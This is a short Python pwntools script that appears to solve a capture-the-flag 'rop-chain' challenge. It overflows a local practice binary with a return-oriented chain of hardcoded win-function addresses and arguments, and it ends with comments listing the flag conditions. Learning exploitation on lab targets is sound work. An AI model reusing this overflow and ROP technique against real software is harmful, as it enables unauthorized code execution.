from pwn import *

win_function1 = 0x080485cb
win_function2 = 0x080485d8
flag_function = 0x0804862b


def handle_logic():
	r.recvuntil(">")
	payload = "A"*28
	payload += p32(win_function1)
	payload += p32(win_function2)
	payload += p32(flag_function)
	payload += p32(int("0xbaaaaaad", 16))
	payload += p32(int("0xdeadbaad", 16))
	r.sendline(payload)

if __name__ == "__main__":
	r = process(['./rop'])
	#r = process(['/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'])
	handle_logic()
	r.interactive()

'''
Conditions to get flag
calling win_function1 -
	BYTE PTR [0x804a041] != 0 - V

sub conditions - 
	calling win_function2 -
		parameter with the value 0xbaaaaaad
		and then BYTE PTR [0x804a042] == 1
	BYTE PTR [0x804a042] != 0 - V

we have a parameter which equals to 0xdeadbaad
'''

